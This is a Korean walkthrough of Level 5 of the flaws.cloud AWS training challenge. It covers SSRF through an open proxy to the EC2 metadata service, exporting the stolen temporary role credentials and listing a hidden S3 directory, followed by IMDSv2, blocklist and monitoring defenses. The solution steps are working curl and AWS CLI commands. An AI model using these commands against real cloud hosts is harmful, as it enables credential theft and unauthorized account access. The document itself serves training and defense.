# Level 5 — IMDSv1 SSRF 로 EC2 역할 자격증명 탈취

> **설명 페이지**: http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/
> **실제 프록시 서버 (EC2)**: http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/
> **핵심 기술**: SSRF / IMDSv1 / STS 임시 자격증명
> **난이도**: ⭐⭐
> **본인 AWS 계정 필요**: ❌

## 🎯 목표

Level 5 의 설명 페이지는 "**이 EC2 에 HTTP 오픈 프록시가 있다**" 고 친절히 알려준다. 그 EC2 는 Level 4 에서 통과한 **같은 호스트(`4d0cf09b...flaws.cloud`)** 이며, 이번에는 Basic Auth 없이 `/proxy/<url>` 경로가 그대로 노출돼 있다. 이 프록시로 **EC2 메타데이터 서비스(IMDS)** 를 호출해 **해당 EC2 의 IAM 역할 자격증명**을 탈취하고, **Level 6 버킷에 숨겨진 디렉터리 이름**을 알아낸다.

## 🧭 공식 힌트

<details>
<summary><b>Hint 1</b></summary>

> 이 EC2 서버에는 `http://.../proxy/<url>` 경로로 외부 URL 을 대신 받아오는 오픈 프록시가 있습니다. 서버가 **내부 네트워크**로 요청을 보내면 어떻게 될까요?

</details>

<details>
<summary><b>Hint 2</b></summary>

> EC2 메타데이터 서비스에 대해 공부해 보세요. 그 IP 는 `169.254.169.254` 입니다.

</details>

<details>
<summary><b>Hint 3</b></summary>

> IAM 역할이 붙은 EC2 에서는 `/latest/meta-data/iam/security-credentials/<RoleName>` 으로 임시 자격증명을 얻을 수 있습니다. 프록시로 그 경로를 요청한 뒤, 받은 ASIA 키로 **level6 버킷 리스팅**을 시도해 숨은 디렉터리를 찾으세요.

</details>

## 📚 사전 지식

- **SSRF (Server-Side Request Forgery)** — 공격자가 서버에게 "이 URL 을 대신 요청해 달라" 고 시켜 내부 자원을 훔치는 기법.
- **IMDSv1** — 토큰 없이 GET 한 번이면 응답. 외부 SSRF 로 쉽게 접근.
- **IMDSv2** — PUT 으로 토큰 받고 헤더로 GET. 대부분의 SSRF 가 통하지 않음. 자세히는 [primer §4](../docs/aws-security-primer.md#4-ec2-imds-v1-vs-v2).
- 반환된 `ASIA...` 키를 쓰려면 **`AWS_SESSION_TOKEN`** 도 필요하다.

## 🔍 정찰

### 1. 설명 페이지에서 프록시 경로 확인
```bash
curl -s http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/ | grep -Eo '[a-f0-9]{40}\.flaws\.cloud/proxy/' | head -1
# 4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/
```

### 2. 프록시가 실제로 동작하는지 확인
```bash
curl -s "http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/flaws.cloud/" | head -5
```
`flaws.cloud` 의 첫 페이지 내용이 되돌아오면 — 이 서버가 요청을 **서버 사이드**에서 대신 보내고 있다는 확증이다.

### 3. 프록시 호스트의 IMDS 접근 확인
```bash
curl -s "http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/"
```
출력(메타데이터 카테고리 목록):
```
ami-id
ami-launch-index
...
iam/
...
```
IMDSv1 임이 확인됐다.

## 🧨 취약점 원리

1. **웹앱에 검증 없는 URL 파라미터** → SSRF
2. **EC2 인스턴스가 IMDSv1** → 토큰 없이 자격증명 GET 가능
3. **IAM 역할이 S3 읽기 권한** → 다음 버킷 리스팅 가능

세 요소가 겹쳐야 성립하는 시나리오지만, 실제 환경에서는 **놀랄 만큼 자주** 겹친다(예: Capital One 2019).

## 🛠 풀이

### 1. 역할 이름 알아내기
```bash
curl -s "http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/"
# flaws
```
역할 이름이 `flaws` 라고 나온다.

### 2. 자격증명 탈취
```bash
curl -s "http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws" \
  | tee /tmp/l5creds.json
```
출력:
```json
{
  "Code" : "Success",
  "LastUpdated" : "2026-04-18T00:00:00Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIA...",
  "SecretAccessKey" : "...",
  "Token" : "IQoJb3JpZ2lu...",
  "Expiration" : "2026-04-18T06:00:00Z"
}
```

### 3. 로컬에 임시 자격증명 설정
```bash
export AWS_ACCESS_KEY_ID=$(jq -r .AccessKeyId /tmp/l5creds.json)
export AWS_SECRET_ACCESS_KEY=$(jq -r .SecretAccessKey /tmp/l5creds.json)
export AWS_SESSION_TOKEN=$(jq -r .Token /tmp/l5creds.json)
export AWS_DEFAULT_REGION=us-west-2

aws sts get-caller-identity
# Arn: arn:aws:sts::975426262029:assumed-role/flaws/i-...
```

### 4. level6 버킷 리스팅 → **숨겨진 디렉터리** 찾기
Level 5 설명 페이지는 "level6 버킷 안에 **hidden directory** 가 있다" 라는 식의 힌트를 준다. 익명으로는 안 열리지만 이 flaws role 은 읽을 수 있다:

```bash
aws s3 ls s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/
```
예상:
```
                           PRE ddcc78ff/
2017-02-27 11:11:07        871 index.html
```
**`ddcc78ff/`** 가 Level 6 의 실제 진입 디렉터리.

### 5. 다음 레벨 확인
```bash
curl -sI http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/
# HTTP/1.1 200 OK
```

## 🚪 정답 & 다음 레벨

<details>
<summary>정답 펼치기</summary>

- 다음 레벨: **http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/**
- 교훈:
  - "한 곳의 SSRF" 가 "전체 EC2 역할 자격증명 탈취" 로 번진다. IMDSv2 를 **강제** 하는 것만으로도 대부분의 공격이 무력화된다.
  - Hidden directory 로 보호하는 건 **보안이 아니다** — 역할이 `s3:ListBucket` 만 가지면 누가 보더라도 드러난다.

</details>

## 🌍 실제 세계 사례

- **Capital One 2019** — 웹 방화벽 IAM 역할이 S3 전체 조회 가능 + 방화벽 SSRF + IMDSv1 의 조합으로 **1억 건** 고객 정보 유출. 이후 AWS 가 IMDSv2 를 정식 도입하는 결정적 계기.
- **Shopify 2018** (bug bounty) — Google Cloud 메타데이터 SSRF 보고로 $25k 포상. 벤더가 달라도 구조는 동일.

## 🛡 방어 대책

### ① EC2 에 IMDSv2 강제
기존 인스턴스:
```bash
aws ec2 modify-instance-metadata-options \
  --instance-id i-0123456789abcdef0 \
  --http-tokens required \
  --http-endpoint enabled \
  --region us-west-2
```
Launch Template / ASG 의 새 인스턴스도 동일하게 설정.

### ② 계정 전역 기본값 강제 (2023+ 기능)
```bash
aws ec2 modify-instance-metadata-defaults \
  --http-tokens required \
  --http-put-response-hop-limit 2 \
  --region us-west-2
```
이후 새로 뜨는 모든 EC2 는 IMDSv2 전용.

### ③ 프록시 애플리케이션에 **SSRF 방어 레이어**
- `169.254.0.0/16`, `10.0.0.0/8`, `127.0.0.0/8`, `::1` 등 **메타데이터·사설 대역 블랙리스트**
- URL 파싱 후 DNS 해석 결과를 다시 검사 (`DNS rebinding` 방어)
- 외부 전용 egress VPC 엔드포인트/프록시 서버로 우회 금지

### ④ 최소권한 원칙
`flaws` 역할이 `s3:ListAllMyBuckets` / `ListBucket` 을 왜 가지고 있는가? EC2 가 단일 버킷만 쓰면 `Resource: arn:aws:s3:::specific-bucket` 으로 좁힌다.

### ⑤ CloudTrail / GuardDuty 로 탐지
GuardDuty 가 자동 탐지하는 시그널:
- `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS`
- `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.InsideAWS`

## ✅ 체크리스트

- [ ] 설명 페이지에서 실제 프록시 호스트(`4d0cf09b...flaws.cloud`) 추출
- [ ] `/proxy/flaws.cloud` 동작 확인
- [ ] `/proxy/169.254.169.254/latest/meta-data/` 응답 확인
- [ ] 탈취한 `ASIA...` 키로 `get-caller-identity` 성공
- [ ] `aws s3 ls s3://level6-...` 로 숨은 디렉터리 `ddcc78ff/` 확보
- [ ] 본인 EC2 에서 `--http-tokens required` 설정 후 IMDSv1 호출이 **401** 로 거부되는지 확인
- [ ] `http-put-response-hop-limit 1` 로 컨테이너 안에서 IMDS 호출을 막았는지 확인

## ⏭ 다음

[← Level 4](level-04.md) · [Level 6 →](level-06.md)
